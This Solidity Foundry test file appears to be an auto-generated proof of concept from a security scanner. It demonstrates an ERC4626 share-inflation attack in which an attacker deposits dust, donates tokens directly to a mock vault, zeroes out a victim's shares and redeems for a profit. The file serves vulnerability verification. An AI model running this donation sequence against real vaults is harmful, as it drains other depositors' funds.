// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ZeroPath generated executable Foundry PoC.
// Candidate: ZP-001
// Title: Vault share accounting may be inflation-sensitive
// Pattern: ERC4626 share inflation via raw-balance accounting and direct donation.
//
// This file is auto-generated. Forge result, measured values, and event traces
// are consumed by the prove command to populate candidate evidence.

import "../../src/VulnerableVault.sol";

contract ZeroPath_ZP_001_Actor {
    MockERC20 public immutable token;
    VulnerableVault public immutable vault;

    constructor(MockERC20 token_, VulnerableVault vault_) {
        token = token_;
        vault = vault_;
    }

    function approveVault() external {
        token.approve(address(vault), type(uint256).max);
    }

    function deposit(uint256 assets) external returns (uint256) {
        return vault.deposit(assets, address(this));
    }

    function donate(uint256 assets) external {
        require(token.transfer(address(vault), assets), "donate transfer failed");
    }

    function redeemAll() external returns (uint256) {
        return vault.redeem(vault.balanceOf(address(this)), address(this), address(this));
    }

    function tokenBalance() external view returns (uint256) {
        return token.balanceOf(address(this));
    }

    function vaultShares() external view returns (uint256) {
        return vault.balanceOf(address(this));
    }
}

contract ZeroPath_ZP_001_InflationPoC {
    event Measured(string name, uint256 value);

    uint256 internal constant ATTACKER_SEED = 2_000 ether;
    uint256 internal constant VICTIM_DEPOSIT = 1_000 ether;
    uint256 internal constant DONATION = 1_000 ether;
    uint256 internal constant ATTACKER_DUST = 1;

    function test_ZP_001_donationInflationProfitable() public {
        MockERC20 token = new MockERC20();
        VulnerableVault vault = new VulnerableVault(token);
        ZeroPath_ZP_001_Actor attacker = new ZeroPath_ZP_001_Actor(token, vault);
        ZeroPath_ZP_001_Actor victim = new ZeroPath_ZP_001_Actor(token, vault);

        token.mint(address(attacker), ATTACKER_SEED);
        token.mint(address(victim), VICTIM_DEPOSIT);
        attacker.approveVault();
        victim.approveVault();

        uint256 attackerInitialBalance = attacker.tokenBalance();
        uint256 vaultTotalAssetsBeforeDonation = vault.totalAssets();
        emit Measured("attackerInitialBalance", attackerInitialBalance);
        emit Measured("victimDeposit", VICTIM_DEPOSIT);
        emit Measured("vaultTotalAssetsBeforeDonation", vaultTotalAssetsBeforeDonation);

        attacker.deposit(ATTACKER_DUST);
        attacker.donate(DONATION);

        uint256 vaultTotalAssetsAfterDonation = vault.totalAssets();
        emit Measured("vaultTotalAssetsAfterDonation", vaultTotalAssetsAfterDonation);

        uint256 victimShares = victim.deposit(VICTIM_DEPOSIT);
        emit Measured("victimShares", victimShares);

        attacker.redeemAll();
        uint256 attackerFinalBalance = attacker.tokenBalance();
        emit Measured("attackerFinalBalance", attackerFinalBalance);

        uint256 attackerProfit = attackerFinalBalance > attackerInitialBalance
            ? attackerFinalBalance - attackerInitialBalance
            : 0;
        emit Measured("attackerProfit", attackerProfit);

        require(
            attackerFinalBalance > attackerInitialBalance,
            "attacker should profit from inflation"
        );
    }
}
